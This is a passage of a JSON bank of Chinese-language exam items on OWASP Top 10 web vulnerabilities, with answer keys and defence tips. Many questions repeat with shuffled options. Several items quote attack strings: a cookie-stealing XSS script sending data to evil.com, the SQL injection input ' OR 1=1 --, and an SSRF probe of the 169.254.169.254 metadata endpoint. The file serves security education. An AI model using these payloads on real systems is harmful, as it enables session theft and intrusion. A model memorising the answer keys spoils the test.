        "en": "SSRF",
        "zh": "伺服器端請求偽造",
        "ipa": "/ˌes.es.ɑːrˈef/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "誘騙後端伺服器向內部網路或雲端 Metadata 服務發起未授權連線並回傳機敏資料，為標準的 SSRF 漏洞。",
    "trap": "防禦應採用嚴格網址白名單並阻斷對私有 IP 與 169.254.169.254 之存取。",
    "law": "OWASP Top 10 A10 SSRF"
  },
  {
    "id": "IPAS-B-447",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某跨國金融控股銀行上線之生產環境網站，因工程師疏失保留了測試階段的 `Debug = True` 設定，當網頁拋出例外時，錯誤頁面詳細印出了資料庫連接字串、帳號密碼與後端代碼路徑。此漏洞屬於：",
    "options": [
      "A. 安全性設定錯誤（Security Misconfiguration）",
      "B. 注入漏洞",
      "C. 軟體供應鏈弱點",
      "D. 身分識別及驗證失敗"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "在正式環境開啟除錯模式（Debug Mode）洩漏詳細系統組態與錯誤堆疊資訊，屬於典型的安全性設定錯誤。",
    "trap": "正式上線前必須關閉 Debug 並將錯誤頁面自訂為通用友善提示。",
    "law": "OWASP Top 10 A05 Security Misconfiguration"
  },
  {
    "id": "IPAS-B-448",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安人員在檢視網站 Cookie 設定時，發現儲存 Session ID 的 Cookie 未啟用 `HttpOnly` 屬性標記。此疏漏會直接導致何種風險加劇？",
    "options": [
      "A. 攻擊者一旦透過 XSS 漏洞注入 JavaScript，即可直接透過 `document.cookie` 讀取並盜走 Session ID",
      "B. 伺服器將無法解析 Cookie",
      "C. 瀏覽器將無法關閉",
      "D. 資料庫會被自動清空"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "HttpOnly 標記指示瀏覽器禁止任何客戶端腳本（如 JS）存取該 Cookie，能大幅降低 XSS 竊取 Session 的危害。",
    "trap": "Cookie 還應搭配 Secure（僅 HTTPS 傳送）與 SameSite 屬性。",
    "law": "RFC 6265"
  },
  {
    "id": "IPAS-B-449",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某區域教學醫學中心的內部文件管理系統允許使用者上傳頭像，但後端未驗證副檔名，導致攻擊者直接上傳了 `shell.aspx` 檔案並在伺服器上成功執行任意指令。此安全弱點稱為：",
    "options": [
      "A. 不受限制的任意檔案上傳（Unrestricted File Upload 導致 WebShell）",
      "B. SQL 注入攻擊",
      "C. 跨網站請求偽造（CSRF）",
      "D. 阻斷服務攻擊"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "未檢查副檔名與 MIME 類型允許上傳可執行動態腳本（如 aspx, php），攻擊者可直接連線執行取得伺服器控制權。",
    "trap": "上傳目錄應禁止執行權限（No-Execute）並重新隨機命名檔案。",
    "law": "OWASP 檔案上傳安全指南"
  },
  {
    "id": "IPAS-B-450",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某高科技晶圓代工大廠在進行靜態應用程式安全測試（SAST）時，資安工具回報系統直接將前端傳遞的序列化資料以 `readObject()` 進行還原，極易遭注入惡意 Gadget Chain 執行任意代碼。此漏洞稱為：",
    "options": [
      "A. 不安全還原（Insecure Deserialization 導致遠端程式碼執行 RCE）",
      "B. 緩衝區溢位",
      "C. 網路斷線",
      "D. 密碼過期"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "不安全還原可遭攻擊者構造之惡意物件在被反序列化時觸發任意代碼執行（RCE），危害極大。",
    "trap": "應避免對不受信任資料直接反序列化，優先使用 JSON 等純資料格式。",
    "law": "OWASP Top 10 A08 軟體與資料完整性失效"
  },
  {
    "id": "IPAS-B-451",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心的會員登入網頁，若使用者在帳號欄位輸入 `' OR 1=1 --`，系統竟然直接繞過密碼檢驗以第一個管理者帳號成功登入。此漏洞之根本成因為何？開發團隊應如何徹底修復？",
    "options": [
      "A. 將資料庫管理員帳號改為 root",
      "B. 僅在前端 JavaScript 阻擋單引號輸入",
      "C. 加大資料庫伺服器記憶體",
      "D. 強制採用參數化查詢（Parameterized Queries）或預備語句（Prepared Statements）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "參數化查詢將 SQL 語句邏輯與資料參數嚴格分離，使用者輸入的任何內容僅會被當作純資料處理，無法改變 SQL 結構，彻底根除 SQL 注入。",
    "trap": "前端檢查極易透過 Burp Suite 繞過，防護必須在後端實現。",
    "law": "OWASP Top 10 A03 注入防護"
  },
  {
    "id": "IPAS-B-452",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠的客戶討論區留言板中，某使用者留言含有 `<script>document.location='http://evil.com/?c='+document.cookie;</script>`。其他訪客瀏覽該留言時，管理者 Session 憑證遭竊取。此漏洞型態屬於：",
    "options": [
      "A. SQL 注入攻擊（SQLi）",
      "B. DOM 型跨網站腳本（DOM-based XSS）",
      "C. 儲存型跨網站腳本（Stored XSS）",
      "D. 反射型跨網站腳本（Reflected XSS）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "惡意腳本存入資料庫留言板中，後續所有瀏覽該頁面的訪客皆會自動執行該腳本並受害，屬於最嚴重的儲存型 XSS（Stored XSS）。",
    "trap": "反射型需要點擊釣魚連結，儲存型則持久保存在伺服器端。",
    "law": "OWASP Top 10 A03 注入與 XSS"
  },
  {
    "id": "IPAS-B-453",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某國立頂尖研究型大學的電子商務訂單查詢介面，網址為 `https://shop.example.com/order?id=1055`。若攻擊者直接將網址修改為 `id=1056`，便能輕易閱覽其他消費者的完整個資與購買紀錄。此安全漏洞屬於：",
    "options": [
      "A. 阻斷服務攻擊（DDoS）",
      "B. 緩衝區溢位（Buffer Overflow）",
      "C. 權限控制失效（Broken Access Control / IDOR）",
      "D. 密碼學失效（Cryptographic Failure）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "IDOR",
        "zh": "不安全的直接物件參照",
        "ipa": "/ˈaɪ.dɔːr/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "直接修改物件識別碼存取他人資料，屬於不安全的直接物件參照（IDOR），本質上為後端未驗證當前登入者是否具備該資料擁有權的「權限控制失效」。",
    "trap": "現為 OWASP Top 10 排名第一之重大弱點類別。",
    "law": "OWASP Top 10 A01 Broken Access Control"
  },
  {
    "id": "IPAS-B-454",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某跨國金融控股銀行委外開發之 Web 應用系統，資料庫將所有會員的使用者密碼以單純 MD5 雜湊且「未加鹽（Salt）」存儲，且使用者登入過程採用純 HTTP 未加密傳輸。在 OWASP Top 10 中屬於哪一類別？",
    "options": [
      "A. 密碼學失效（Cryptographic Failures）",
      "B. 軟體及資料完整性失效",
      "C. 注入攻擊",
      "D. 安全性設定錯誤"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "使用已被證實不安全之 MD5 且未加鹽保護，外加明文 HTTP 傳輸，屬於典型的密碼學失效。",
    "trap": "現代密碼存儲應採用 Argon2id、bcrypt 或 PBKDF2 並強制加鹽。",
    "law": "OWASP Top 10 A02 Cryptographic Failures"
  },
  {
    "id": "IPAS-B-455",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠網路銀行系統為防止惡意第三方網站誘使已登入受害者瀏覽器發送未授權轉帳請求（CSRF 攻擊），在前後端架構上最應加入下列何項防禦機制？",
    "options": [
      "A. 取消所有使用者的登入功能",
      "B. 實作不可預測之一次性 CSRF Token（或同步權杖）並設置 Cookie SameSite 屬性",
      "C. 僅依賴 HTTP Referer 檢查",
      "D. 採用更長的使用者密碼"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "CSRF Token 與 SameSite=Lax/Strict Cookie 能有效防止外部偽造請求隨同瀏覽器 Cookie 一併發送。",
    "trap": "單純依賴 Referer 容易被繞過或因隱私策略被瀏覽器移除。",
    "law": "OWASP CSRF 防禦指引"
  },
  {
    "id": "IPAS-B-456",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某國立頂尖研究型大學的雲端 Web 服務具備「自訂圖片網址抓取頭像」功能。攻擊者輸入 `http://169.254.169.254/latest/meta-data/` 成功刺探並取得雲端主機之臨時 IAM 存取金鑰。此漏洞屬於：",
    "options": [
      "A. 伺服器端請求偽造（SSRF, Server-Side Request Forgery）",
      "B. 中間人攻擊（MitM）",
      "C. 跨網站腳本（XSS）",
      "D. 本地檔案包含（LFI）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "SSRF",
        "zh": "伺服器端請求偽造",
        "ipa": "/ˌes.es.ɑːrˈef/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "誘騙後端伺服器向內部網路或雲端 Metadata 服務發起未授權連線並回傳機敏資料，為標準的 SSRF 漏洞。",
    "trap": "防禦應採用嚴格網址白名單並阻斷對私有 IP 與 169.254.169.254 之存取。",
    "law": "OWASP Top 10 A10 SSRF"
  },
  {
    "id": "IPAS-B-457",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠上線之生產環境網站，因工程師疏失保留了測試階段的 `Debug = True` 設定，當網頁拋出例外時，錯誤頁面詳細印出了資料庫連接字串、帳號密碼與後端代碼路徑。此漏洞屬於：",
    "options": [
      "A. 軟體供應鏈弱點",
      "B. 安全性設定錯誤（Security Misconfiguration）",
      "C. 注入漏洞",
      "D. 身分識別及驗證失敗"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "在正式環境開啟除錯模式（Debug Mode）洩漏詳細系統組態與錯誤堆疊資訊，屬於典型的安全性設定錯誤。",
    "trap": "正式上線前必須關閉 Debug 並將錯誤頁面自訂為通用友善提示。",
    "law": "OWASP Top 10 A05 Security Misconfiguration"
  },
  {
    "id": "IPAS-B-458",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某國立頂尖研究型大學資安人員在檢視網站 Cookie 設定時，發現儲存 Session ID 的 Cookie 未啟用 `HttpOnly` 屬性標記。此疏漏會直接導致何種風險加劇？",
    "options": [
      "A. 攻擊者一旦透過 XSS 漏洞注入 JavaScript，即可直接透過 `document.cookie` 讀取並盜走 Session ID",
      "B. 資料庫會被自動清空",
      "C. 瀏覽器將無法關閉",
      "D. 伺服器將無法解析 Cookie"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "HttpOnly 標記指示瀏覽器禁止任何客戶端腳本（如 JS）存取該 Cookie，能大幅降低 XSS 竊取 Session 的危害。",
    "trap": "Cookie 還應搭配 Secure（僅 HTTPS 傳送）與 SameSite 屬性。",
    "law": "RFC 6265"
  },
  {
    "id": "IPAS-B-459",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某大型連鎖量販流通集團的內部文件管理系統允許使用者上傳頭像，但後端未驗證副檔名，導致攻擊者直接上傳了 `shell.aspx` 檔案並在伺服器上成功執行任意指令。此安全弱點稱為：",
    "options": [
      "A. 不受限制的任意檔案上傳（Unrestricted File Upload 導致 WebShell）",
      "B. 跨網站請求偽造（CSRF）",
      "C. 阻斷服務攻擊",
      "D. SQL 注入攻擊"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "未檢查副檔名與 MIME 類型允許上傳可執行動態腳本（如 aspx, php），攻擊者可直接連線執行取得伺服器控制權。",
    "trap": "上傳目錄應禁止執行權限（No-Execute）並重新隨機命名檔案。",
    "law": "OWASP 檔案上傳安全指南"
  },
  {
    "id": "IPAS-B-460",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某知名大型網路電商平台在進行靜態應用程式安全測試（SAST）時，資安工具回報系統直接將前端傳遞的序列化資料以 `readObject()` 進行還原，極易遭注入惡意 Gadget Chain 執行任意代碼。此漏洞稱為：",
    "options": [
      "A. 緩衝區溢位",
      "B. 密碼過期",
      "C. 網路斷線",
      "D. 不安全還原（Insecure Deserialization 導致遠端程式碼執行 RCE）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "不安全還原可遭攻擊者構造之惡意物件在被反序列化時觸發任意代碼執行（RCE），危害極大。",
    "trap": "應避免對不受信任資料直接反序列化，優先使用 JSON 等純資料格式。",
    "law": "OWASP Top 10 A08 軟體與資料完整性失效"
  },
  {
    "id": "IPAS-B-461",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某金流與行動支付科技公司的會員登入網頁，若使用者在帳號欄位輸入 `' OR 1=1 --`，系統竟然直接繞過密碼檢驗以第一個管理者帳號成功登入。此漏洞之根本成因為何？開發團隊應如何徹底修復？",
    "options": [
      "A. 僅在前端 JavaScript 阻擋單引號輸入",
      "B. 強制採用參數化查詢（Parameterized Queries）或預備語句（Prepared Statements）",
      "C. 將資料庫管理員帳號改為 root",
      "D. 加大資料庫伺服器記憶體"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "參數化查詢將 SQL 語句邏輯與資料參數嚴格分離，使用者輸入的任何內容僅會被當作純資料處理，無法改變 SQL 結構，彻底根除 SQL 注入。",
    "trap": "前端檢查極易透過 Burp Suite 繞過，防護必須在後端實現。",
    "law": "OWASP Top 10 A03 注入防護"
  },
  {
    "id": "IPAS-B-462",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心的客戶討論區留言板中，某使用者留言含有 `<script>document.location='http://evil.com/?c='+document.cookie;</script>`。其他訪客瀏覽該留言時，管理者 Session 憑證遭竊取。此漏洞型態屬於：",
    "options": [
      "A. 儲存型跨網站腳本（Stored XSS）",
      "B. 反射型跨網站腳本（Reflected XSS）",
      "C. SQL 注入攻擊（SQLi）",
      "D. DOM 型跨網站腳本（DOM-based XSS）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "惡意腳本存入資料庫留言板中，後續所有瀏覽該頁面的訪客皆會自動執行該腳本並受害，屬於最嚴重的儲存型 XSS（Stored XSS）。",
    "trap": "反射型需要點擊釣魚連結，儲存型則持久保存在伺服器端。",
    "law": "OWASP Top 10 A03 注入與 XSS"
  },
  {
    "id": "IPAS-B-463",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某知名大型網路電商平台的電子商務訂單查詢介面，網址為 `https://shop.example.com/order?id=1055`。若攻擊者直接將網址修改為 `id=1056`，便能輕易閱覽其他消費者的完整個資與購買紀錄。此安全漏洞屬於：",
    "options": [
      "A. 權限控制失效（Broken Access Control / IDOR）",
      "B. 阻斷服務攻擊（DDoS）",
      "C. 密碼學失效（Cryptographic Failure）",
      "D. 緩衝區溢位（Buffer Overflow）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "IDOR",
        "zh": "不安全的直接物件參照",
        "ipa": "/ˈaɪ.dɔːr/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "直接修改物件識別碼存取他人資料，屬於不安全的直接物件參照（IDOR），本質上為後端未驗證當前登入者是否具備該資料擁有權的「權限控制失效」。",
    "trap": "現為 OWASP Top 10 排名第一之重大弱點類別。",
    "law": "OWASP Top 10 A01 Broken Access Control"
  },
  {
    "id": "IPAS-B-464",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某知名大型網路電商平台委外開發之 Web 應用系統，資料庫將所有會員的使用者密碼以單純 MD5 雜湊且「未加鹽（Salt）」存儲，且使用者登入過程採用純 HTTP 未加密傳輸。在 OWASP Top 10 中屬於哪一類別？",
    "options": [
      "A. 安全性設定錯誤",
      "B. 注入攻擊",
      "C. 軟體及資料完整性失效",
      "D. 密碼學失效（Cryptographic Failures）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "使用已被證實不安全之 MD5 且未加鹽保護，外加明文 HTTP 傳輸，屬於典型的密碼學失效。",
    "trap": "現代密碼存儲應採用 Argon2id、bcrypt 或 PBKDF2 並強制加鹽。",
    "law": "OWASP Top 10 A02 Cryptographic Failures"
  },
  {
    "id": "IPAS-B-465",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某金流與行動支付科技公司網路銀行系統為防止惡意第三方網站誘使已登入受害者瀏覽器發送未授權轉帳請求（CSRF 攻擊），在前後端架構上最應加入下列何項防禦機制？",
    "options": [
      "A. 實作不可預測之一次性 CSRF Token（或同步權杖）並設置 Cookie SameSite 屬性",
      "B. 採用更長的使用者密碼",
      "C. 僅依賴 HTTP Referer 檢查",
      "D. 取消所有使用者的登入功能"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "CSRF Token 與 SameSite=Lax/Strict Cookie 能有效防止外部偽造請求隨同瀏覽器 Cookie 一併發送。",
    "trap": "單純依賴 Referer 容易被繞過或因隱私策略被瀏覽器移除。",
    "law": "OWASP CSRF 防禦指引"
  },
  {
    "id": "IPAS-B-466",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某跨國金融控股銀行的雲端 Web 服務具備「自訂圖片網址抓取頭像」功能。攻擊者輸入 `http://169.254.169.254/latest/meta-data/` 成功刺探並取得雲端主機之臨時 IAM 存取金鑰。此漏洞屬於：",
    "options": [
      "A. 伺服器端請求偽造（SSRF, Server-Side Request Forgery）",
      "B. 本地檔案包含（LFI）",
      "C. 中間人攻擊（MitM）",
      "D. 跨網站腳本（XSS）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "SSRF",
        "zh": "伺服器端請求偽造",
        "ipa": "/ˌes.es.ɑːrˈef/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "誘騙後端伺服器向內部網路或雲端 Metadata 服務發起未授權連線並回傳機敏資料，為標準的 SSRF 漏洞。",
    "trap": "防禦應採用嚴格網址白名單並阻斷對私有 IP 與 169.254.169.254 之存取。",
    "law": "OWASP Top 10 A10 SSRF"
  },
  {
    "id": "IPAS-B-467",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商上線之生產環境網站，因工程師疏失保留了測試階段的 `Debug = True` 設定，當網頁拋出例外時，錯誤頁面詳細印出了資料庫連接字串、帳號密碼與後端代碼路徑。此漏洞屬於：",
    "options": [
      "A. 軟體供應鏈弱點",
      "B. 注入漏洞",
      "C. 身分識別及驗證失敗",
      "D. 安全性設定錯誤（Security Misconfiguration）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "在正式環境開啟除錯模式（Debug Mode）洩漏詳細系統組態與錯誤堆疊資訊，屬於典型的安全性設定錯誤。",
    "trap": "正式上線前必須關閉 Debug 並將錯誤頁面自訂為通用友善提示。",
    "law": "OWASP Top 10 A05 Security Misconfiguration"
  },
  {
    "id": "IPAS-B-468",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安人員在檢視網站 Cookie 設定時，發現儲存 Session ID 的 Cookie 未啟用 `HttpOnly` 屬性標記。此疏漏會直接導致何種風險加劇？",
    "options": [
      "A. 資料庫會被自動清空",
      "B. 攻擊者一旦透過 XSS 漏洞注入 JavaScript，即可直接透過 `document.cookie` 讀取並盜走 Session ID",
      "C. 瀏覽器將無法關閉",
      "D. 伺服器將無法解析 Cookie"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "HttpOnly 標記指示瀏覽器禁止任何客戶端腳本（如 JS）存取該 Cookie，能大幅降低 XSS 竊取 Session 的危害。",
    "trap": "Cookie 還應搭配 Secure（僅 HTTPS 傳送）與 SameSite 屬性。",
    "law": "RFC 6265"
  },
  {
    "id": "IPAS-B-469",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠的內部文件管理系統允許使用者上傳頭像，但後端未驗證副檔名，導致攻擊者直接上傳了 `shell.aspx` 檔案並在伺服器上成功執行任意指令。此安全弱點稱為：",
    "options": [
      "A. 阻斷服務攻擊",
      "B. SQL 注入攻擊",
      "C. 不受限制的任意檔案上傳（Unrestricted File Upload 導致 WebShell）",
      "D. 跨網站請求偽造（CSRF）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "未檢查副檔名與 MIME 類型允許上傳可執行動態腳本（如 aspx, php），攻擊者可直接連線執行取得伺服器控制權。",
    "trap": "上傳目錄應禁止執行權限（No-Execute）並重新隨機命名檔案。",
    "law": "OWASP 檔案上傳安全指南"
  },
  {
    "id": "IPAS-B-470",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某區域教學醫學中心在進行靜態應用程式安全測試（SAST）時，資安工具回報系統直接將前端傳遞的序列化資料以 `readObject()` 進行還原，極易遭注入惡意 Gadget Chain 執行任意代碼。此漏洞稱為：",
    "options": [
      "A. 密碼過期",
      "B. 不安全還原（Insecure Deserialization 導致遠端程式碼執行 RCE）",
      "C. 網路斷線",
      "D. 緩衝區溢位"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "不安全還原可遭攻擊者構造之惡意物件在被反序列化時觸發任意代碼執行（RCE），危害極大。",
    "trap": "應避免對不受信任資料直接反序列化，優先使用 JSON 等純資料格式。",
    "law": "OWASP Top 10 A08 軟體與資料完整性失效"
  },
  {
    "id": "IPAS-B-471",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠的會員登入網頁，若使用者在帳號欄位輸入 `' OR 1=1 --`，系統竟然直接繞過密碼檢驗以第一個管理者帳號成功登入。此漏洞之根本成因為何？開發團隊應如何徹底修復？",
    "options": [
      "A. 加大資料庫伺服器記憶體",
      "B. 強制採用參數化查詢（Parameterized Queries）或預備語句（Prepared Statements）",
      "C. 僅在前端 JavaScript 阻擋單引號輸入",
      "D. 將資料庫管理員帳號改為 root"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "參數化查詢將 SQL 語句邏輯與資料參數嚴格分離，使用者輸入的任何內容僅會被當作純資料處理，無法改變 SQL 結構，彻底根除 SQL 注入。",
    "trap": "前端檢查極易透過 Burp Suite 繞過，防護必須在後端實現。",
    "law": "OWASP Top 10 A03 注入防護"
  },
  {
    "id": "IPAS-B-472",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某國立頂尖研究型大學的客戶討論區留言板中，某使用者留言含有 `<script>document.location='http://evil.com/?c='+document.cookie;</script>`。其他訪客瀏覽該留言時，管理者 Session 憑證遭竊取。此漏洞型態屬於：",
    "options": [
      "A. DOM 型跨網站腳本（DOM-based XSS）",
      "B. 反射型跨網站腳本（Reflected XSS）",
      "C. SQL 注入攻擊（SQLi）",
      "D. 儲存型跨網站腳本（Stored XSS）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "惡意腳本存入資料庫留言板中，後續所有瀏覽該頁面的訪客皆會自動執行該腳本並受害，屬於最嚴重的儲存型 XSS（Stored XSS）。",
    "trap": "反射型需要點擊釣魚連結，儲存型則持久保存在伺服器端。",
    "law": "OWASP Top 10 A03 注入與 XSS"
  },
  {
    "id": "IPAS-B-473",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某大型連鎖量販流通集團的電子商務訂單查詢介面，網址為 `https://shop.example.com/order?id=1055`。若攻擊者直接將網址修改為 `id=1056`，便能輕易閱覽其他消費者的完整個資與購買紀錄。此安全漏洞屬於：",
    "options": [
      "A. 權限控制失效（Broken Access Control / IDOR）",
      "B. 阻斷服務攻擊（DDoS）",
      "C. 緩衝區溢位（Buffer Overflow）",
      "D. 密碼學失效（Cryptographic Failure）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "IDOR",
        "zh": "不安全的直接物件參照",
        "ipa": "/ˈaɪ.dɔːr/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "直接修改物件識別碼存取他人資料，屬於不安全的直接物件參照（IDOR），本質上為後端未驗證當前登入者是否具備該資料擁有權的「權限控制失效」。",
    "trap": "現為 OWASP Top 10 排名第一之重大弱點類別。",
    "law": "OWASP Top 10 A01 Broken Access Control"
  },
  {
    "id": "IPAS-B-474",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某大型連鎖量販流通集團委外開發之 Web 應用系統，資料庫將所有會員的使用者密碼以單純 MD5 雜湊且「未加鹽（Salt）」存儲，且使用者登入過程採用純 HTTP 未加密傳輸。在 OWASP Top 10 中屬於哪一類別？",
    "options": [
      "A. 注入攻擊",
      "B. 安全性設定錯誤",
      "C. 軟體及資料完整性失效",
      "D. 密碼學失效（Cryptographic Failures）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "使用已被證實不安全之 MD5 且未加鹽保護，外加明文 HTTP 傳輸，屬於典型的密碼學失效。",
    "trap": "現代密碼存儲應採用 Argon2id、bcrypt 或 PBKDF2 並強制加鹽。",
    "law": "OWASP Top 10 A02 Cryptographic Failures"
  },
  {
    "id": "IPAS-B-475",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某公務機關資訊處網路銀行系統為防止惡意第三方網站誘使已登入受害者瀏覽器發送未授權轉帳請求（CSRF 攻擊），在前後端架構上最應加入下列何項防禦機制？",
    "options": [
      "A. 採用更長的使用者密碼",
      "B. 僅依賴 HTTP Referer 檢查",
      "C. 取消所有使用者的登入功能",
      "D. 實作不可預測之一次性 CSRF Token（或同步權杖）並設置 Cookie SameSite 屬性"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "CSRF",
